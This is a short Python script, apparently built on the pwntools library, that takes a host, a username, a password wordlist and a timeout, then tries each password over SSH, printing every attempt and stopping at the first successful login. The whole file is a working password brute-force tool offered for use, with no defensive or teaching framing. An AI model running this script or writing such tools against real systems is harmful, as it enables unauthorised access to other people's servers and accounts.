import sys
from pwn import *

if len([arg for arg in sys.argv]) != 5:
    print("One or more arguments are empty")
    exit()

host = sys.argv[1]
user = sys.argv[2]
fileName = sys.argv[3]
timeOut = sys.argv[4]

Connected = "Connected"

def tryConnect(
        host:string,
        user:string,
        password:string,
        timeout:int):
    try:
        response = ssh(
            host=host,
            user=user,
            password=password,
            timeout=timeout)
        if response.connected():
            response.close()
            return Connected
    except Exception as exception:
        return str(exception)

def openFile(fileName:string):
    with open (fileName, "r") as values:
        for value in values:
            value = value.strip("\n")
            yield value

def tryBruteForce(
        host:string,
        user:string,
        fileName:string,
        timeOut:int):
    try:
        for attempts, password in enumerate(
            openFile(fileName)):
            print(
                "[{}] Attempting password: '{}'"
                    .format(attempts, password))
            connection = tryConnect(
                host,
                user,
                password,
                timeOut)
            print(connection)
            if connection == Connected:
                break
    except Exception as exception:
        print(exception)

tryBruteForce(host, user, fileName, timeOut)